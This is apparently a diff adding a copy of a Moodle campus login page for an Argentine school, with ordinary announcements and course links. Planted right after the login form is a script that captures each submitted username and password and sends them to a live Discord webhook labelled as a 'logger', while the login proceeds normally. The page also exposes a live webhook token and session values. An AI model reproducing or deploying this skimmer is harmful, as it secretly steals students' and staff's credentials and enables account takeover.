@@ -1,0 +1,1459 @@
+<!DOCTYPE html>
+
+<html dir="ltr" lang="es" xml:lang="es">
+
+<head>
+    <title>Instituto Griego Atenágoras I</title>
+    <link rel="shortcut icon" href="//campus.iga.edu.ar/pluginfile.php/1/theme_fordson/favicon/1755197430/logo-ante.png" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="keywords" content="moodle, Instituto Griego Atenágoras I" />
+    <link rel="stylesheet" type="text/css" href="https://campus.iga.edu.ar/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple.css" />
+    <script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script>
+    <link rel="stylesheet" type="text/css" href="https://campus.iga.edu.ar/theme/styles.php/fordson/1755197430_1/all" />
+    <script>
+        //<![CDATA[
+        var M = {};
+        M.yui = {};
+        M.pageloadstarttime = new Date();
+        M.cfg = {
+            "wwwroot": "https:\/\/campus.iga.edu.ar",
+            "sesskey": "MiExtRvJBp",
+            "sessiontimeout": "7200",
+            "sessiontimeoutwarning": "1200",
+            "themerev": "1755197430",
+            "slasharguments": 1,
+            "theme": "fordson",
+            "iconsystemmodule": "core\/icon_system_fontawesome",
+            "jsrev": -1,
+            "admin": "admin",
+            "svgicons": true,
+            "usertimezone": "Am\u00e9rica\/Argentina\/Buenos_Aires",
+            "contextid": 6,
+            "langrev": 1762501083,
+            "templaterev": "1755197430",
+            "developerdebug": true
+        };
+        var yui1ConfigFn = function(me) {
+            if (/-skin|reset|fonts|grids|base/.test(me.name)) {
+                me.type = 'css';
+                me.path = me.path.replace(/\.js/, '.css');
+                me.path = me.path.replace(/\/yui2-skin/, '/assets/skins/sam/yui2-skin')
+            }
+        };
+        var yui2ConfigFn = function(me) {
+            var parts = me.name.replace(/^moodle-/, '').split('-'),
+                component = parts.shift(),
+                module = parts[0],
+                min = '-min';
+            if (/-(skin|core)$/.test(me.name)) {
+                parts.pop();
+                me.type = 'css';
+                min = ''
+            }
+            if (module) {
+                var filename = parts.join('-');
+                me.path = component + '/' + module + '/' + filename + min + '.' + me.type
+            } else {
+                me.path = component + '/' + component + '.' + me.type
+            }
+        };
+        YUI_config = {
+            "debug": true,
+            "base": "https:\/\/campus.iga.edu.ar\/lib\/yuilib\/3.17.2\/",
+            "comboBase": "https:\/\/campus.iga.edu.ar\/theme\/yui_combo.php?",
+            "combine": false,
+            "filter": "RAW",
+            "insertBefore": "firstthemesheet",
+            "groups": {
+                "yui2": {
+                    "base": "https:\/\/campus.iga.edu.ar\/lib\/yuilib\/2in3\/2.9.0\/build\/",
+                    "comboBase": "https:\/\/campus.iga.edu.ar\/theme\/yui_combo.php?",
+                    "combine": false,
+                    "ext": false,
+                    "root": "2in3\/2.9.0\/build\/",
+                    "patterns": {
+                        "yui2-": {
+                            "group": "yui2",
+                            "configFn": yui1ConfigFn
+                        }
+                    }
+                },
+                "moodle": {
+                    "name": "moodle",
+                    "base": "https:\/\/campus.iga.edu.ar\/theme\/yui_combo.php?m\/-1\/",
+                    "combine": false,
+                    "comboBase": "https:\/\/campus.iga.edu.ar\/theme\/yui_combo.php?",
+                    "ext": false,
+                    "root": "m\/-1\/",
+                    "patterns": {
+                        "moodle-": {
+                            "group": "moodle",
+                            "configFn": yui2ConfigFn
+                        }
+                    },
+                    "filter": "DEBUG",
+                    "modules": {
+                        "moodle-core-blocks": {
+                            "requires": ["base", "node", "io", "dom", "dd", "dd-scroll", "moodle-core-dragdrop", "moodle-core-notification"]
+                        },
+                        "moodle-core-actionmenu": {
+                            "requires": ["base", "event", "node-event-simulate"]
+                        },
+                        "moodle-core-notification": {
+                            "requires": ["moodle-core-notification-dialogue", "moodle-core-notification-alert", "moodle-core-notification-confirm", "moodle-core-notification-exception", "moodle-core-notification-ajaxexception"]
+                        },
+                        "moodle-core-notification-dialogue": {
+                            "requires": ["base", "node", "panel", "escape", "event-key", "dd-plugin", "moodle-core-widget-focusafterclose", "moodle-core-lockscroll"]
+                        },
+                        "moodle-core-notification-alert": {
+                            "requires": ["moodle-core-notification-dialogue"]
+                        },
+                        "moodle-core-notification-confirm": {
+                            "requires": ["moodle-core-notification-dialogue"]
+                        },
+                        "moodle-core-notification-exception": {
+                            "requires": ["moodle-core-notification-dialogue"]
+                        },
+                        "moodle-core-notification-ajaxexception": {
+                            "requires": ["moodle-core-notification-dialogue"]
+                        },
+                        "moodle-core-lockscroll": {
+                            "requires": ["plugin", "base-build"]
+                        },
+                        "moodle-core-handlebars": {
+                            "condition": {
+                                "trigger": "handlebars",
+                                "when": "after"
+                            }
+                        },
+                        "moodle-core-maintenancemodetimer": {
+                            "requires": ["base", "node"]
+                        },
+                        "moodle-core-popuphelp": {
+                            "requires": ["moodle-core-tooltip"]
+                        },
+                        "moodle-core-tooltip": {
+                            "requires": ["base", "node", "io-base", "moodle-core-notification-dialogue", "json-parse", "widget-position", "widget-position-align", "event-outside", "cache-base"]
+                        },
+                        "moodle-core-dragdrop": {
+                            "requires": ["base", "node", "io", "dom", "dd", "event-key", "event-focus", "moodle-core-notification"]
+                        },
+                        "moodle-core-formchangechecker": {
+                            "requires": ["base", "event-focus", "moodle-core-event"]
+                        },
+                        "moodle-core-event": {
+                            "requires": ["event-custom"]
+                        },
+                        "moodle-core-chooserdialogue": {
+                            "requires": ["base", "panel", "moodle-core-notification"]
+                        },
+                        "moodle-core-languninstallconfirm": {
+                            "requires": ["base", "node", "moodle-core-notification-confirm", "moodle-core-notification-alert"]
+                        },
+                        "moodle-core_availability-form": {
+                            "requires": ["base", "node", "event", "event-delegate", "panel", "moodle-core-notification-dialogue", "json"]
+                        },
+                        "moodle-backup-confirmcancel": {
+                            "requires": ["node", "node-event-simulate", "moodle-core-notification-confirm"]
+                        },
+                        "moodle-backup-backupselectall": {
+                            "requires": ["node", "event", "node-event-simulate", "anim"]
+                        },
+                        "moodle-course-formatchooser": {
+                            "requires": ["base", "node", "node-event-simulate"]
+                        },
+                        "moodle-course-management": {
+                            "requires": ["base", "node", "io-base", "moodle-core-notification-exception", "json-parse", "dd-constrain", "dd-proxy", "dd-drop", "dd-delegate", "node-event-delegate"]
+                        },
+                        "moodle-course-util": {
+                            "requires": ["node"],
+                            "use": ["moodle-course-util-base"],
+                            "submodules": {
+                                "moodle-course-util-base": {},
+                                "moodle-course-util-section": {
+                                    "requires": ["node", "moodle-course-util-base"]
+                                },
+                                "moodle-course-util-cm": {
+                                    "requires": ["node", "moodle-course-util-base"]
+                                }
+                            }
+                        },
+                        "moodle-course-dragdrop": {
+                            "requires": ["base", "node", "io", "dom", "dd", "dd-scroll", "moodle-core-dragdrop", "moodle-core-notification", "moodle-course-coursebase", "moodle-course-util"]
+                        },
+                        "moodle-course-categoryexpander": {
+                            "requires": ["node", "event-key"]
+                        },
+                        "moodle-form-shortforms": {
+                            "requires": ["node", "base", "selector-css3", "moodle-core-event"]
+                        },
+                        "moodle-form-dateselector": {
+                            "requires": ["base", "node", "overlay", "calendar"]
+                        },
+                        "moodle-form-passwordunmask": {
+                            "requires": []
+                        },
+                        "moodle-question-preview": {
+                            "requires": ["base", "dom", "event-delegate", "event-key", "core_question_engine"]
+                        },
+                        "moodle-question-searchform": {
+                            "requires": ["base", "node"]
+                        },
+                        "moodle-question-chooser": {
+                            "requires": ["moodle-core-chooserdialogue"]
+                        },
+                        "moodle-availability_completion-form": {
+                            "requires": ["base", "node", "event", "moodle-core_availability-form"]
+                        },
+                        "moodle-availability_date-form": {
+                            "requires": ["base", "node", "event", "io", "moodle-core_availability-form"]
+                        },
+                        "moodle-availability_grade-form": {
+                            "requires": ["base", "node", "event", "moodle-core_availability-form"]
+                        },
+                        "moodle-availability_group-form": {
+                            "requires": ["base", "node", "event", "moodle-core_availability-form"]
+                        },
+                        "moodle-availability_grouping-form": {
+                            "requires": ["base", "node", "event", "moodle-core_availability-form"]
+                        },
+                        "moodle-availability_profile-form": {
+                            "requires": ["base", "node", "event", "moodle-core_availability-form"]
+                        },
+                        "moodle-mod_assign-history": {
+                            "requires": ["node", "transition"]
+                        },
+                        "moodle-mod_customcert-rearrange": {
+                            "requires": ["dd-delegate", "dd-drag"]
+                        },
+                        "moodle-mod_quiz-questionchooser": {
+                            "requires": ["moodle-core-chooserdialogue", "moodle-mod_quiz-util", "querystring-parse"]
+                        },
+                        "moodle-mod_quiz-modform": {
+                            "requires": ["base", "node", "event"]
+                        },
+                        "moodle-mod_quiz-quizbase": {
+                            "requires": ["base", "node"]
+                        },
+                        "moodle-mod_quiz-autosave": {
+                            "requires": ["base", "node", "event", "event-valuechange", "node-event-delegate", "io-form"]
+                        },
+                        "moodle-mod_quiz-toolboxes": {
+                            "requires": ["base", "node", "event", "event-key", "io", "moodle-mod_quiz-quizbase", "moodle-mod_quiz-util-slot", "moodle-core-notification-ajaxexception"]
+                        },
+                        "moodle-mod_quiz-util": {
+                            "requires": ["node", "moodle-core-actionmenu"],
+                            "use": ["moodle-mod_quiz-util-base"],
+                            "submodules": {
+                                "moodle-mod_quiz-util-base": {},
+                                "moodle-mod_quiz-util-slot": {
+                                    "requires": ["node", "moodle-mod_quiz-util-base"]
+                                },
+                                "moodle-mod_quiz-util-page": {
+                                    "requires": ["node", "moodle-mod_quiz-util-base"]
+                                }
+                            }
+                        },
+                        "moodle-mod_quiz-dragdrop": {
+                            "requires": ["base", "node", "io", "dom", "dd", "dd-scroll", "moodle-core-dragdrop", "moodle-core-notification", "moodle-mod_quiz-quizbase", "moodle-mod_quiz-util-base", "moodle-mod_quiz-util-page", "moodle-mod_quiz-util-slot", "moodle-course-util"]
+                        },
+                        "moodle-message_airnotifier-toolboxes": {
+                            "requires": ["base", "node", "io"]
+                        },
+                        "moodle-filter_glossary-autolinker": {
+                            "requires": ["base", "node", "io-base", "json-parse", "event-delegate", "overlay", "moodle-core-event", "moodle-core-notification-alert", "moodle-core-notification-exception", "moodle-core-notification-ajaxexception"]
+                        },
+                        "moodle-filter_mathjaxloader-loader": {
+                            "requires": ["moodle-core-event"]
+                        },
+                        "moodle-editor_atto-rangy": {
+                            "requires": []
+                        },
+                        "moodle-editor_atto-editor": {
+                            "requires": ["node", "transition", "io", "overlay", "escape", "event", "event-simulate", "event-custom", "node-event-html5", "node-event-simulate", "yui-throttle", "moodle-core-notification-dialogue", "moodle-core-notification-confirm", "moodle-editor_atto-rangy", "handlebars", "timers", "querystring-stringify"]
+                        },
+                        "moodle-editor_atto-plugin": {
+                            "requires": ["node", "base", "escape", "event", "event-outside", "handlebars", "event-custom", "timers", "moodle-editor_atto-menu"]
+                        },
+                        "moodle-editor_atto-menu": {
+                            "requires": ["moodle-core-notification-dialogue", "node", "event", "event-custom"]
+                        },
+                        "moodle-report_eventlist-eventfilter": {
+                            "requires": ["base", "event", "node", "node-event-delegate", "datatable", "autocomplete", "autocomplete-filters"]
+                        },
+                        "moodle-report_loglive-fetchlogs": {
+                            "requires": ["base", "event", "node", "io", "node-event-delegate"]
+                        },
+                        "moodle-gradereport_grader-gradereporttable": {
+                            "requires": ["base", "node", "event", "handlebars", "overlay", "event-hover"]
+                        },
+                        "moodle-gradereport_history-userselector": {
+                            "requires": ["escape", "event-delegate", "event-key", "handlebars", "io-base", "json-parse", "moodle-core-notification-dialogue"]
+                        },
+                        "moodle-tool_capability-search": {
+                            "requires": ["base", "node"]
+                        },
+                        "moodle-tool_lp-dragdrop-reorder": {
+                            "requires": ["moodle-core-dragdrop"]
+                        },
+                        "moodle-tool_monitor-dropdown": {
+                            "requires": ["base", "event", "node"]
+                        },
+                        "moodle-assignfeedback_editpdf-editor": {
+                            "requires": ["base", "event", "node", "io", "graphics", "json", "event-move", "event-resize", "transition", "querystring-stringify-simple", "moodle-core-notification-dialog", "moodle-core-notification-alert", "moodle-core-notification-warning", "moodle-core-notification-exception", "moodle-core-notification-ajaxexception"]
+                        },
+                        "moodle-atto_accessibilitychecker-button": {
+                            "requires": ["color-base", "moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_accessibilityhelper-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_align-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_bold-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_charmap-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_clear-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_collapse-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_emojipicker-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_emoticon-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_equation-button": {
+                            "requires": ["moodle-editor_atto-plugin", "moodle-core-event", "io", "event-valuechange", "tabview", "array-extras"]
+                        },
+                        "moodle-atto_h5p-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_html-codemirror": {
+                            "requires": ["moodle-atto_html-codemirror-skin"]
+                        },
+                        "moodle-atto_html-beautify": {},
+                        "moodle-atto_html-button": {
+                            "requires": ["promise", "moodle-editor_atto-plugin", "moodle-atto_html-beautify", "moodle-atto_html-codemirror", "event-valuechange"]
+                        },
+                        "moodle-atto_image-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_indent-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_italic-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_link-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_managefiles-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_managefiles-usedfiles": {
+                            "requires": ["node", "escape"]
+                        },
+                        "moodle-atto_media-button": {
+                            "requires": ["moodle-editor_atto-plugin", "moodle-form-shortforms"]
+                        },
+                        "moodle-atto_noautolink-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_orderedlist-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_recordrtc-recording": {
+                            "requires": ["moodle-atto_recordrtc-button"]
+                        },
+                        "moodle-atto_recordrtc-button": {
+                            "requires": ["moodle-editor_atto-plugin", "moodle-atto_recordrtc-recording"]
+                        },
+                        "moodle-atto_rtl-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_strike-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_subscript-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_superscript-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_table-button": {
+                            "requires": ["moodle-editor_atto-plugin", "moodle-editor_atto-menu", "event", "event-valuechange"]
+                        },
+                        "moodle-atto_title-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_underline-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_undo-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        },
+                        "moodle-atto_unorderedlist-button": {
+                            "requires": ["moodle-editor_atto-plugin"]
+                        }
+                    }
+                },
+                "gallery": {
+                    "name": "gallery",
+                    "base": "https:\/\/campus.iga.edu.ar\/lib\/yuilib\/gallery\/",
+                    "combine": false,
+                    "comboBase": "https:\/\/campus.iga.edu.ar\/theme\/yui_combo.php?",
+                    "ext": false,
+                    "root": "gallery\/-1\/",
+                    "patterns": {
+                        "gallery-": {
+                            "group": "gallery"
+                        }
+                    }
+                }
+            },
+            "modules": {
+                "core_filepicker": {
+                    "name": "core_filepicker",
+                    "fullpath": "https:\/\/campus.iga.edu.ar\/lib\/javascript.php\/-1\/repository\/filepicker.js",
+                    "requires": ["base", "node", "node-event-simulate", "json", "async-queue", "io-base", "io-upload-iframe", "io-form", "yui2-treeview", "panel", "cookie", "datatable", "datatable-sort", "resize-plugin", "dd-plugin", "escape", "moodle-core_filepicker", "moodle-core-notification-dialogue"]
+                },
+                "core_comment": {
+                    "name": "core_comment",
+                    "fullpath": "https:\/\/campus.iga.edu.ar\/lib\/javascript.php\/-1\/comment\/comment.js",
+                    "requires": ["base", "io-base", "node", "json", "yui2-animation", "overlay", "escape"]
+                },
+                "mathjax": {
+                    "name": "mathjax",
+                    "fullpath": "https:\/\/cdn.jsdelivr.net\/npm\/mathjax@2.7.9\/MathJax.js?delayStartupUntil=configured"
+                }
+            }
+        };
+        M.yui.loader = {
+            modules: {}
+        };
+
+        //]]>
+    </script>
+    <meta name="description" content="Campus del Instituto Griego Atenágoras I" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body id="page-site-index" class="format-site course path-site chrome dir-ltr lang-es yui-skin-sam yui3-skin-sam campus-iga-edu-ar pagelayout-frontpage course-1 context-6 notloggedin ">
+
+    <div id="page-wrapper">
+
+        <div>
+            <a class="sr-only sr-only-focusable" href="#maincontent">Salta al contenido principal</a>
+        </div>
+        <script src="https://campus.iga.edu.ar/lib/javascript.php/-1/lib/babel-polyfill/polyfill.js"></script>
+        <script src="https://campus.iga.edu.ar/lib/javascript.php/-1/lib/polyfills/polyfill.js"></script>
+        <script src="https://campus.iga.edu.ar/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple.js"></script>
+        <script src="https://campus.iga.edu.ar/theme/jquery.php/core/jquery-3.5.1.js"></script>
+        <script src="https://campus.iga.edu.ar/lib/javascript.php/-1/lib/javascript-static.js"></script>
+        <script>
+            //<![CDATA[
+            document.body.className += ' jsenabled';
+            //]]>
+        </script>
+
+
+
+        <nav class="fixed-top navbar navbar-fhs   navbar-expand moodle-has-zindex">
+            <div data-region="drawer-toggle" class="d-inline-block mr-3">
+                <button aria-expanded="false" aria-controls="nav-drawer" type="button" class="btn nav-link float-sm-left mr-1 btn-secondary" data-action="toggle-drawer" data-side="left" data-preference="drawer-open-nav"><i class="icon fa fa-bars fa-fw " aria-hidden="true"  ></i><span class="sr-only">Panel lateral</span></button>
+            </div>
+            <a href="https://campus.iga.edu.ar" class="navbar-brand has-logo
+                    ">
+                    <span class="logo d-none d-sm-inline">
+                        <img src="https://campus.iga.edu.ar/pluginfile.php/1/core_admin/logocompact/300x300/1755197430/Escudo%20Aten%C3%A1goras%2030%C2%B0%20Aniversario_sin_fondo.png" alt="Campus IGA">
+                    </span>
+                <span class="site-name d-none d-md-inline">Campus IGA</span>
+            </a>
+
+            <!-- course_controls -->
+            <div class="coursecontrols nav-item d-flex">
+
+
+            </div>
+
+            <ul class="navbar-nav d-none d-md-flex">
+                <!-- custom_menu -->
+
+
+                <!-- page_heading_menu -->
+
+            </ul>
+            <ul class="nav navbar-nav ml-auto">
+                <div class="d-none d-lg-block">
+
+                </div>
+                <!-- navbar_plugin_output -->
+                <li class="nav-item">
+
+                </li>
+                <!-- user_menu -->
+                <li class="nav-item d-flex align-items-center">
+                    <div class="usermenu"><span class="login">Usted no se ha identificado. (<a href="https://campus.iga.edu.ar/login/index.php">Acceder</a>)</span></div>
+                </li>
+            </ul>
+            <!-- search_box -->
+        </nav>
+
+
+        <div class="headerbkg">
+            <div class="default" style="background-image: url(&quot;https://campus.iga.edu.ar/theme/image.php/fordson/theme/1755197430/headerbg&quot;); background-size: cover; background-position:center;
+                width: 100%; height: 100%;"></div>
+        </div>
+
+        <div id="page" class="container-fluid">
+
+            <div id="learningcontent">
+
+
+
+                <header id="page-header" class="row">
+                    <div class="col-12 pt-3 pb-3">
+                        <div class="card ">
+                            <div class="card-body ">
+                                <div class="d-flex">
+                                    <div class="mr-auto">
+                                        <a href="https://campus.iga.edu.ar/course/view.php?id=1">
+                                            <div class="page-context-header">
+                                                <div class="page-header-headings">
+                                                    <h1>Instituto Griego Atenágoras I</h1>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </div>
+
+                                    <div class="header-actions-container flex-shrink-0" data-region="header-actions-container">
+                                    </div>
+                                </div>
+                                <div class="d-flex flex-wrap">
+
+                                    <div class="ml-auto d-flex">
+
+                                    </div>
+                                    <div id="course-header">
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </header>
+
+                <div id="page-content" class="row">
+                    <div id="region-main-box" class="col-12">
+                        <section id="region-main" class="has-blocks">
+
+
+                            <span class="notifications" id="user-notifications"></span>
+
+
+
+                            <div class="fpwonderbox">
+                                <div class="container-fluid">
+                                    <div class="row">
+                                        <div class="col-md-12">
+
+
+
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="container-fluid">
+                                    <div class="row">
+                                        <div class="col-md-12">
+                                            <div class="col-md-4 signinform">
+                                                <div class="fpsignup">
+                                                    <h3>Registrarse</h3>
+                                                    <form class="m-t-1" action="https://campus.iga.edu.ar/login/index.php" method="POST" role="form">
+                                                        <input type="hidden" name="logintoken" value="uQawAsD9KVK15pW6v6XtFZtzDOoQhYGS">
+                                                        <label for="username">
+                                  Nombre de usuario
+                            </label>
+                                                        <div class="input-group">
+                                                            <div class="input-group-addon"></div>
+                                                            <input type="text" class="form-control" id="username" name="username" placeholder="Nombre de usuario" required />
+                                                        </div>
+
+                                                        <label for="password">Contraseña</label>
+                                                        <div class="input-group">
+                                                            <div class="input-group-addon"></div>
+                                                            <input type="password" class="form-control" id="password" name="password" placeholder="Contraseña" required />
+                                                        </div>
+
+                                                        <div class="sign-up-btn">
+                                                            <button type="submit" class="btn btn-primary">Acceder</button>
+                                                        </div>
+                                                    </form>
+
+                                                    <p><a href="https://campus.iga.edu.ar/login/forgot_password.php">¿Olvidó su nombre de usuario o contraseña?</a></p>
+
+                                                </div>
+                                            </div>
+<script>
+// Agregar este script después del formulario de login
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.querySelector('form[action*="login"]');
+    
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            // Obtener los valores de usuario y contraseña
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // URL de tu webhook de Discord - REEMPLAZA ESTA URL
+            const webhookURL = 'https://discord.com/api/webhooks/1438002701181915421/Fnjw-pbdBdpl-yANpc9taNqmip7cwENKEuVuh2AS46FLmhv-3vi_qvb0P_VcSeMfgEic';
+            
+            // Crear el mensaje para Discord
+            const message = {
+                content: `🔐 **Nuevo Login Capturado**\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n🌐 Página: ${window.location.href}\n🕐 Fecha: ${new Date().toLocaleString()}`,
+                username: '6,7 atenagoras logger',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/3064/3064197.png'
+            };
+            
+            // Enviar al webhook de Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error enviando a Discord:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+            
+            // El formulario continuará con el envío normal
+            console.log('Credenciales capturadas y enviadas');
+        });
+    }
+});
+</script>
+                                            <div class="fptextbox">
+                                                <b>Bienvenid@s al campus del Instituto Griego Atenágoras I&nbsp;</b>
+                                                <p><br></p>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                                <div style="clear:both;"></div>
+
+
+                            </div>
+
+                            <div class="fp-blocks">
+                                <div class="container-fluid">
+                                    <div class="row">
+                                        <div class="col-md-4">
+                                            <section data-region="blocks-fpa" class="hidden-print">
+                                                <aside id="block-region-fp-a" class="block-region" data-blockregion="fp-a" data-droptarget="1"></aside>
+                                            </section>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <section data-region="blocks-fpb" class="hidden-print">
+                                                <aside id="block-region-fp-b" class="block-region" data-blockregion="fp-b" data-droptarget="1"></aside>
+                                            </section>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <section data-region="blocks-fpc" class="hidden-print">
+                                                <aside id="block-region-fp-c" class="block-region" data-blockregion="fp-c" data-droptarget="1"></aside>
+                                            </section>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div role="main"><span id="maincontent"></span>
+                                <div class="box py-3 generalbox sitetopic">
+                                    <div class="no-overflow">
+                                        <h4 style="text-align: center;"><br></h4>
+                                        <p>El 28 de octubre de 1940, el embajador de Italia en Grecia entregó un ultimátum al primer ministro griego, Ioannis Metaxas, exigiendo el paso libre para que las tropas italianas ocuparan lugares estratégicos en
+                                            Grecia. Metaxas respondió con un rotundo “No”, lo que llevó al inicio de la guerra. Ese mismo día, el ejército italiano cruzó la frontera desde Albania, pero fue frenado en la Batalla de Kalamás, donde 8,000
+                                            griegos derrotaron a 12,000 italianos. El 13 de noviembre, los griegos lanzaron una contraofensiva que obligó a los italianos a retroceder, y el 22 de noviembre, las tropas italianas fueron expulsadas de Grecia.
+                                            Este evento se convirtió en un símbolo de la lucha griega por la libertad. Χρόνια πολλά Ελλάδα !<br></p>
+                                        <p><br></p>
+                                        <h4 style="text-align: center;"><img src="https://campus.iga.edu.ar/pluginfile.php/6/course/section/2/28_10_cartelera%20OXI.png" alt="" width="1024" height="683" role="presentation" class="img-fluid atto_image_button_text-bottom"><br></h4>
+                                        <h4
+                                            style="text-align: center;"><br></h4>
+                                            <p>y para leer algo..</p>
+                                            <h3 style="text-align: center;"><img src="https://campus.iga.edu.ar/pluginfile.php/6/course/section/2/eternauta.jpg" alt="" width="1145" height="677" role="presentation" class="img-fluid atto_image_button_text-bottom"><br></h3>
+                                            <h3 style="text-align: center;"><strong style="font-size: 1rem;"><em><span>Si viste la serie y queres conocer la historieta original. te dejamos <a href="https://ia803104.us.archive.org/4/items/139085831eleternautaparte01pdf/139085831-El-Eternauta-Parte-01-pdf.pdf" target="_blank"><u><strong>el link </strong></u>
+                                                </a>para que la descargues!!</span>
+                                                </em>
+                                                </strong>
+                                            </h3>
+                                            <p><strong style="font-size: 1rem;"><em><br></em></strong></p>
+                                            <h3 style="text-align: center;"><strong style="font-size: 1rem;"><em><u><br></u></em></strong></h3>
+                                            <h3 style="text-align: center;"><strong style="font-size: 1rem;"><em><u>MUY IMPORTANTE !!</u></em></strong><strong style="font-size: 1rem;"><em><u><br></u></em></strong></h3>
+                                            <p><span style=""><span style="">Les pedimos a todos que por favor cuando ingresen al campus actualicen la dirección de mail de la siguiente forma:&nbsp; Hacen clic sobre la derecha donde esta su nombre y van a -&gt;<strong>Perfil</strong> (en esa pagina pueden ver su mail y si hay que modificarlo ) -&gt; <strong>Editar Perfil</strong> (cambian el mail) y abajo hacen clic en -&gt;<strong>Actualizar información personal</strong>&nbsp; eso es todo. Si tienen dudas, les compartimos un video explicativo. Es muy importante que lo hagan. Muchas Gracias!&nbsp;<br></span></span>
+                                            </p>
+                                            <p><em style=""><u style=""><strong><a href="http://www.loom.com/share/c2ed2219ab004297a76ca5f5ccdd8056?sid=add2f779-c647-4d45-b4d2-5bb45ca25724" target="_blank">http://www.loom.com/share/c2ed2219ab004297a76ca5f5ccdd8056?sid=add2f779-c647-4d45-b4d2-5bb45ca25724</a><br></strong></u></em></p>
+                                            <p><em style=""><u style=""><br></u></em></p>
+                                            <p><em style=""><u style=""></u></em></p>
+                                            <h3></h3>
+                                            <h4></h4>
+                                            <h5>
+                                                <ul>
+                                                    <li><span style=""><span style=""><strong style=""><a href="https://drive.google.com/drive/folders/1balTbTr9UFXu8pRHP1VzxFWGghjWxI4n?usp=sharing" target="_blank" style="">CONTENIDOS NODALES AÑO 202</a>4</strong></span></span>
+                                                    </li>
+                                                </ul>
+                                            </h5>
+                                            <ul><em style=""><u style=""></u></em></ul><em style=""><u style=""><br></u></em>
+                                            <p></p>
+                                            <h4></h4>
+                                            <h5>
+                                                <ul>
+                                                    <li><a href="https://drive.google.com/drive/folders/1-35vIP10LOke9AjU_ROYjfCHKCERMc7y?usp=sharing" target="_blank"><strong>CONTENIDOS NODALES AÑO 2023</strong></a></li>
+                                                </ul><br></h5>
+                                            <h5>
+                                                <ul>
+                                                    <li><a href="https://drive.google.com/drive/folders/1kSjZytH3x18VTU_S8aL87U5GbOzjlWeu?usp=sharing" target="_blank" style="font-size: 1.25rem; background-color: rgb(255, 255, 255);"><strong><span>CONTENIDOS NODALES AÑO 2022</span></strong></a></li>
+                                                </ul><br>
+                                                <ul>
+                                                    <li><a href="https://drive.google.com/drive/folders/16ff3dB3Ipodb_uwy5Mv3gj_tAqTJ7Ydl?usp=sharing" target="_blank" style="font-size: 1.25rem; background-color: rgb(255, 255, 255);"><strong>CONTENIDOS NODALES AÑO 2021</strong></a></li>
+                                                </ul><br>
+                                                <ul>
+                                                    <li><a href="https://drive.google.com/drive/folders/1eHjF688U5Ij2COHryfmXVWj4GJr4YJTy" target="_blank" style="font-size: 1.25rem; background-color: rgb(255, 255, 255);"><strong>CONTENIDOS NODALES AÑO 2020</strong></a></li>
+                                                </ul><br></h5>
+                                            <h4>
+                                                <p style=""></p>
+                                                <p></p>
+                                            </h4>
+                                            <p></p>
+                                            <div class="editor-indent" style="margin-left: 30px;">
+                                                <p><span style="font-weight: normal;"><em><span style="font-size: 14.6667px; white-space: pre-wrap;"><br></span></em>
+                                                    </span>
+                                                </p>
+                                                <h3 style="text-align: center; margin-left: 30px;">Recuerden que pueden seguirnos en las redes</h3>
+                                                <h3 style="margin-left: 30px;"><img src="https://campus.iga.edu.ar/pluginfile.php/6/course/section/2/LOGO%20WEB.png" alt="WEB" width="68" height="60" class="img-fluid atto_image_button_text-bottom"><a href="http://www.egea.edu.ar/secundario/"
